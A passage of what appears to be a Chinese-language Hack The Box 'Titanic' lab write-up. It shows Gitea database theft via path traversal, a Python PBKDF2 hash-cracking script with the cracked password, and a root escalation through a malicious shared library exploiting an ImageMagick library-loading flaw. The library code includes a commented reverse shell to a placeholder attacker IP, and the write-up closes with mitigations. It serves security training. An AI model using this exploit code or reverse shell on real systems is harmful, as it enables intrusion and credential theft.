+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405123159724.png" alt="数据库配置信息放大"></p>
+<p>关键信息：</p>
+<ul>
+<li>数据库类型：SQLite3</li>
+<li>数据库文件路径 (容器内): <code>/data/gitea/gitea.db</code></li>
+</ul>
+<p>结合之前的 Volume 映射 (<code>/home/developer/gitea/data:/data</code>)，我们可以确定数据库文件在<strong>宿主机上的绝对路径</strong>为：<code>/home/developer/gitea/data/gitea/gitea.db</code>。</p>
+<h3 id="四、-获取用户权限-User-Flag">四、 获取用户权限 (User Flag)</h3>
+<h4 id="1-下载-Gitea-数据库">1. 下载 Gitea 数据库</h4>
+<p>既然知道了数据库文件的绝对路径，我们可以再次利用路径遍历漏洞将其下载到本地进行分析：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405124107721.png" alt="下载数据库文件"></p>
+<h4 id="2-分析数据库，提取密码哈希">2. 分析数据库，提取密码哈希</h4>
+<p>使用 SQLite 客户端打开下载的 <code>gitea.db</code> 文件，查找用户表（通常是 <code>user</code> 表）。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405133810808.png" alt="查询数据库用户信息"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405134020289.png" alt="密码哈希与盐值"></p>
+<p>找到了 <code>developer</code> 用户的密码哈希和对应的盐值 (Salt)：</p>
+<ul>
+<li><strong>用户:</strong> developer</li>
+<li><strong>哈希 (passwd):</strong> <code>e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56</code></li>
+<li><strong>盐 (salt):</strong> <code>8bf3e3452b78544f8bee9400d6936d34</code> (需要注意，数据库中存储的是 Hex 编码的字符串，使用时需要解码为 bytes)</li>
+</ul>
+<p>Gitea 通常使用 PBKDF2-HMAC-SHA256 算法来存储密码哈希。需要破解这个哈希来获取 <code>developer</code> 用户的明文密码。</p>
+<h4 id="3-破解密码哈希">3. 破解密码哈希</h4>
+<p>可以使用 Hashcat 或者编写一个简单的 Python 脚本来尝试破解。使用 <code>hashlib.pbkdf2_hmac</code> 结合字典进行爆破。Gitea 的默认迭代次数通常较高（如 50000），需要在破解时指定正确的参数。</p>
+<p><strong>准备字典:</strong> 将使用常见的 <code>rockyou.txt</code> 字典。</p>
+<p><strong>Python 破解脚本 (<code>crack_gitea.py</code>):</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pbkdf2_hash</span>(<span class="params">password, salt, iterations=<span class="number">50000</span>, dklen=<span class="number">50</span></span>):</span><br><span class="line">    hash_value = hashlib.pbkdf2_hmac(</span><br><span class="line">        <span class="string">&#x27;sha256&#x27;</span>,</span><br><span class="line">        password.encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">        salt,</span><br><span class="line">        iterations,</span><br><span class="line">        dklen</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> hash_value</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_matching_password</span>(<span class="params">dictionary_file, target_hash, salt, iterations=<span class="number">50000</span>, dklen=<span class="number">50</span></span>):</span><br><span class="line">    target_hash_bytes = binascii.unhexlify(target_hash)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dictionary_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            password = line.strip()</span><br><span class="line">            hash_value = pbkdf2_hash(password, salt, iterations, dklen)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在检查密码 <span class="subst">&#123;count&#125;</span>: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> hash_value == target_hash_bytes:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nFound password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> password</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Password not found.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">salt = binascii.unhexlify(<span class="string">&#x27;8bf3e3452b78544f8bee9400d6936d34&#x27;</span>)</span><br><span class="line">target_hash = <span class="string">&#x27;e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56&#x27;</span></span><br><span class="line"><span class="comment"># 字典的路径</span></span><br><span class="line">dictionary_file = <span class="string">&#x27;/home/admin/tool/rockyou.txt&#x27;</span></span><br><span class="line">find_matching_password(dictionary_file, target_hash, salt)</span><br></pre></td></tr></table></figure>
+<p><strong>运行脚本进行破解:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crack_gitea.py</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405141629124.png" alt="密码破解成功"></p>
+<p>脚本成功找到了密码！</p>
+<ul>
+<li><strong>用户名:</strong> developer</li>
+<li><strong>密码:</strong> 25282528</li>
+</ul>
+<h4 id="4-SSH-登录并获取-User-Flag">4. SSH 登录并获取 User Flag</h4>
+<p>现在我们拥有了 <code>developer</code> 用户的凭据，可以通过 SSH 登录目标机器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh developer@titanic.htb</span><br><span class="line"><span class="comment"># 输入密码: 25282528</span></span><br></pre></td></tr></table></figure>
+<p>登录成功后，查找并读取 <code>user.txt</code> 文件：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405143242393.png" alt="获取User Flag"></p>
+<p>成功获取 User Flag！</p>
+<h3 id="五、-权限提升-Root-Flag">五、 权限提升 (Root Flag)</h3>
+<p>获取了普通用户权限后，下一步是寻找提权到 root 的方法。</p>
+<h4 id="1-本地枚举">1. 本地枚举</h4>
+<p>在 <code>developer</code> 用户下进行枚举，寻找潜在的提权向量。检查 <code>sudo -l</code>、SUID 文件、计划任务 (cron jobs)、系统服务配置、可写目录和可执行脚本等。</p>
+<ul>
+<li>
+<p><code>sudo -l</code>: <code>developer</code> 用户无法免密执行任何 sudo 命令。</p>
+</li>
+<li>
+<p>查找可执行脚本和可写目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找 /opt 目录下用户可执行的文件</span></span><br><span class="line">developer@titanic:~$ find /opt -<span class="built_in">type</span> f -perm -u=x 2&gt;/dev/null</span><br><span class="line">/opt/scripts/identify_images.sh</span><br><span class="line">/opt/app/app.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 /opt 目录下用户可写的目录</span></span><br><span class="line">developer@titanic:~$ find /opt -writable -<span class="built_in">type</span> d 2&gt;/dev/null</span><br><span class="line">/opt/app/static/assets/images</span><br><span class="line">/opt/app/tickets</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405151136589.png" alt="查找可执行文件和可写目录"><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405151201427.png" alt="查找可执行文件和可写目录结果"></p>
+<p>我们发现了一个可执行脚本 <code>/opt/scripts/identify_images.sh</code> 和一个用户可写的目录 <code>/opt/app/static/assets/images</code>。这值得深入研究。</p>
+<h4 id="2-分析可疑脚本">2. 分析可疑脚本</h4>
+<p>查看 <code>/opt/scripts/identify_images.sh</code> 的内容：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405151308895.png" alt="查看脚本内容"></p>
+<p>脚本的关键行为：</p>
+<ol>
+<li><code>cd /opt/app/static/assets/images</code>: <strong>切换工作目录到我们可写的目录！</strong></li>
+<li>执行 <code>/usr/bin/magick identify</code> 命令处理该目录下的 <code>.jpg</code> 文件。</li>
+</ol>
+<p>如果这个脚本是由 <code>root</code> 用户定期运行（例如通过 cron），并且 <code>magick</code> 命令存在某种漏洞，我们就有机会利用可写目录来执行代码。</p>
+<h4 id="3-检查-ImageMagick-版本并查找漏洞">3. 检查 ImageMagick 版本并查找漏洞</h4>
+<p>查看 <code>/usr/bin/magick</code> 的版本：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405151344371.png" alt="查看ImageMagick版本"></p>
+<p>版本为 <code>ImageMagick 7.1.1-35</code>。搜索该版本的漏洞，发现一个相关的 CVE 或安全公告：<strong>GHSA-8rxc-922v-phg8</strong>。</p>
+<p>这个漏洞与 ImageMagick 的 <strong>AppImage</strong> 打包有关。其 <code>AppRun</code> 启动脚本在设置某些环境变量（如 <code>LD_PRELOAD</code>, <code>LD_LIBRARY_PATH</code> 或 <code>MAGICK_CONFIGURE_PATH</code>）时，会查找并加载当前工作目录下的某些配置文件或库文件。</p>
+<p><strong>漏洞利用思路:</strong></p>
+<ol>
+<li><code>/opt/scripts/identify_images.sh</code> 脚本首先 <code>cd</code> 进入了我们可写的目录 <code>/opt/app/static/assets/images</code>。</li>
+<li>然后，脚本以其执行者（推测是 root）的权限执行 <code>/usr/bin/magick identify</code>。</li>
+<li>由于 <code>magick</code> 是一个 AppImage 打包的程序 (或其启动脚本存在类似行为)，它在启动时会检查当前工作目录（也就是我们可写的 <code>/opt/app/static/assets/images</code>）是否存在特定的库文件。</li>
+<li>如果我们在这个可写目录下放置一个精心构造的、与 ImageMagick 期望加载的库同名的恶意共享库（<code>.so</code> 文件），那么 <code>magick</code> 命令在执行时就会加载并执行我们库中的代码。</li>
+<li>利用 C 语言的 <code>__attribute__((constructor))</code> 特性，可以在共享库被加载时自动执行我们定义的函数（Payload）。</li>
+</ol>
+<h4 id="4-制作并部署恶意共享库">4. 制作并部署恶意共享库</h4>
+<p><strong>a. 编写恶意 C 代码 (<code>exploit.c</code>):</strong></p>
+<p>创建一个 C 文件，包含我们的 payload。Payload 的目标是将 <code>/root/root.txt</code> 文件复制到我们可访问的目录 <code>/opt/app/static/assets/images/</code> 并修改其权限，以便我们能读取它。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个函数会在库被加载时自动运行</span></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">run_payload</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 以 root 权限执行复制和修改权限操作</span></span><br><span class="line">    system(<span class="string">&quot;cp /root/root.txt /opt/app/static/assets/images/root.txt&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod 777 /opt/app/static/assets/images/root.txt&quot;</span>);</span><br><span class="line">    <span class="comment">// 可以选择性地添加其他命令，例如反弹 shell</span></span><br><span class="line">    <span class="comment">// system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/YOUR_ATTACKER_IP/PORT 0&gt;&amp;1&#x27;&quot;);</span></span><br><span class="line">    <span class="comment">// exit(0); // 执行完后可以退出，避免 ImageMagick 报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>b. 编译共享库:</strong></p>
+<p>在你的攻击机或目标机器上（如果目标机器上有 <code>gcc</code>），使用 <code>gcc</code> 将 C 代码编译成共享库。根据漏洞 PoC 或常见实践，我们可以尝试使用 ImageMagick 可能加载的库名，例如 <code>libxcb.so.1</code>。</p>
+<p>将编译好的 <code>libxcb.so.1</code> 文件放置到目标脚本的工作目录，也就是我们可写的 <code>/opt/app/static/assets/images/</code> 目录下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o ./libxcb.so.1 exploit.c</span><br></pre></td></tr></table></figure>
+<h4 id="5-等待触发与获取-Root-Flag">5. 等待触发与获取 Root Flag</h4>
+<p>现在，我们只需要等待 <code>/opt/scripts/identify_images.sh</code> 脚本被执行。这个脚本很可能是通过 <code>root</code> 用户的 Cron 任务定时运行的（例如，每隔几分钟）。</p>
+<p>当脚本运行时：</p>
+<ol>
+<li>它会 <code>cd</code> 到 <code>/opt/app/static/assets/images/</code>。</li>
+<li>它会以 <code>root</code> 权限执行 <code>/usr/bin/magick identify</code>。</li>
+<li><code>magick</code> 进程启动时，会查找并加载当前目录下的 <code>libxcb.so.1</code>。</li>
+<li>我们恶意库中的 <code>run_payload</code> 函数被执行。</li>
+<li><code>/root/root.txt</code> 文件被复制到 <code>/opt/app/static/assets/images/root.txt</code>，并且权限被设置为 <code>777</code>。</li>
+</ol>
+<p>等待一小段时间（可能需要几分钟），然后检查 <code>/opt/app/static/assets/images/</code> 目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">developer@titanic:/opt/app/static/assets/images$ <span class="built_in">ls</span> -l</span><br><span class="line">total 1.3M</span><br><span class="line">-rwxrwxrwx 1 root      root         33 Apr  5 07:05 root.txt  <span class="comment"># &lt;-- 文件出现了！权限是 777</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405152445792.png" alt="Root Flag 文件出现"></p>
+<p>成功获取 Root Flag！</p>
+<h3 id="六、-总结">六、 总结</h3>
+<p>Titanic 靶机是一次有趣且涵盖多种技术的渗透测试体验：</p>
+<ol>
+<li><strong>初始 foothold:</strong> 通过 Nmap 发现重定向，配置 hosts 文件访问 Web 服务。</li>
+<li><strong>Web 漏洞:</strong> 利用预订表单后的 <code>/download</code> 功能存在的路径遍历漏洞，读取了敏感文件。</li>
+<li><strong>信息泄露:</strong> 通过路径遍历读取了 <code>dev</code> 子域 Gitea 服务的配置文件 (<code>app.ini</code>) 和 SQLite 数据库 (<code>gitea.db</code>)。</li>
+<li><strong>密码破解:</strong> 从数据库中提取了 <code>developer</code> 用户的 PBKDF2 哈希和盐值，并使用字典爆破得到明文密码。</li>
+<li><strong>获取用户权限:</strong> 使用破解的凭据 SSH 登录 <code>developer</code> 用户，获得 user flag。</li>
+<li><strong>权限提升:</strong> 分析发现一个由 root 运行的脚本 (<code>identify_images.sh</code>) 会在用户可写目录下执行 ImageMagick (<code>magick</code>)。利用 ImageMagick AppImage 的库加载漏洞 (GHSA-8rxc-922v-phg8)，通过放置恶意共享库 (<code>.so</code> 文件) 在脚本的工作目录，实现了代码执行，最终获取了 root flag。</li>
+</ol>
+<h3 id="七、-防护与缓解措施">七、 防护与缓解措施</h3>
+<ol>
+<li>
+<p><strong>修复路径遍历漏洞 (<code>/download</code>):</strong></p>
+<ul>
+<li>对用户输入进行严格过滤，禁止路径遍历字符 (<code>../</code>)。</li>
+<li>在访问文件前，确保请求的路径位于授权的目录下。</li>
+</ul>
+</li>
+<li>
+<p><strong>保护敏感文件:</strong></p>
+<ul>
+<li>修复导致文件泄露的根源漏洞（如路径遍历）。</li>
+<li>遵循最小权限原则，确保 Web 应用进程无权访问 Gitea 等其他服务的配置文件和数据。</li>
+</ul>
+</li>
+<li>
+<p><strong>强化身份验证:</strong></p>
+<ul>
+<li>强制使用强密码策略，增加密码破解难度。</li>
+<li>考虑为 Gitea 等关键服务启用双因素认证 (2FA)。</li>
+</ul>
+</li>
+<li>
+<p><strong>安全配置计划任务与脚本:</strong></p>
+<ul>
+<li>避免让以高权限运行的脚本（如 Cron 任务）在用户可写的目录下执行外部命令。</li>
+<li>如果必须在特定目录执行，确保所调用的程序（如 ImageMagick）已更新至最新版本，并已修复已知的库加载或命令注入漏洞。</li>
+<li>定期审计系统上的 SUID/SGID 文件、计划任务和不安全的服务配置。</li>
+</ul>
+</li>
+</ol>
+
+<div class="article-footer fs14"></div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/04/02/Dog%20%E2%80%94%20Hack%20The%20Box/">Hackthebox 赛季靶场 Dog Writeup</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><center>
+  <p>© <span id="copyright_year"></span> Rabbit 使用 Stellar 创建</p>
+  <p>✨ 营业：<span id="runtime_span"></span> ✨</p>
+  <p>共发表 <span id="blog_count">56</span> 篇Blog 🔸 总计 <span id="total_words">123.6k</span> 字</p>
+  <script type="text/javascript">
+    (function() {
+      // 动态年份
+      document.getElementById('copyright_year').textContent = new Date().getFullYear();
+
+      // 运行时长
+      const startDate = new Date('2023-12-20T00:00:00');
+      function updateRuntime() {
+        const now = new Date();
+        const diff = now - startDate;
+        const days = Math.floor(diff / (24 * 60 * 60 * 1000));
+        const hours = Math.floor((diff % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
+        const minutes = Math.floor((diff % (60 * 60 * 1000)) / (60 * 1000));
+        const seconds = Math.floor((diff % (60 * 1000)) / 1000);
+        document.getElementById('runtime_span').innerHTML =
+          `${days}天-${hours}小时-${minutes}分-${seconds}秒`; // 修改输出格式
+      }
+      setInterval(updateRuntime, 1000);
+      updateRuntime();
+
+      // 博客统计数据 (这里是静态示例，你可以根据实际情况手动更新或动态获取)
+      // document.getElementById('blog_count').textContent = '你的博客文章总数';
+      // document.getElementById('total_words').textContent = '你的博客文章总字数';
+    })();
+  </script>
+</center>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E5%88%9D%E5%A7%8B%E6%8E%A2%E6%B5%8B"><span class="toc-text">一、 信息收集与初始探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-Nmap"><span class="toc-text">1. 端口扫描 (Nmap)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%85%8D%E7%BD%AE-Hosts-%E6%96%87%E4%BB%B6"><span class="toc-text">2. 配置 Hosts 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AE%BF%E9%97%AE-Web-%E6%9C%8D%E5%8A%A1"><span class="toc-text">3. 访问 Web 服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-Web-%E5%BA%94%E7%94%A8%E6%9E%9A%E4%B8%BE%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-text">二、 Web 应用枚举与漏洞发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8A%80%E6%9C%AF%E6%A0%88%E8%AF%86%E5%88%AB-WhatWeb"><span class="toc-text">1. 技术栈识别 (WhatWeb)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%9B%AE%E5%BD%95%E4%B8%8E%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F"><span class="toc-text">2. 目录与子域名扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4%E4%B8%8E%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-text">3. 表单提交与路径遍历漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81-%E5%88%A9%E7%94%A8%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%B7%B1%E5%85%A5%E6%8C%96%E6%8E%98"><span class="toc-text">三、 利用路径遍历深入挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8E%A2%E7%B4%A2%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83-dev-titanic-htb"><span class="toc-text">1. 探索开发环境 (dev.titanic.htb)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%AF%BB%E5%8F%96-Gitea-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">2. 读取 Gitea 配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%86%E6%9E%90%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E5%AE%9A%E4%BD%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">3. 分析配置文件，定位数据库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90-User-Flag"><span class="toc-text">四、 获取用户权限 (User Flag)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%B8%8B%E8%BD%BD-Gitea-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">1. 下载 Gitea 数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 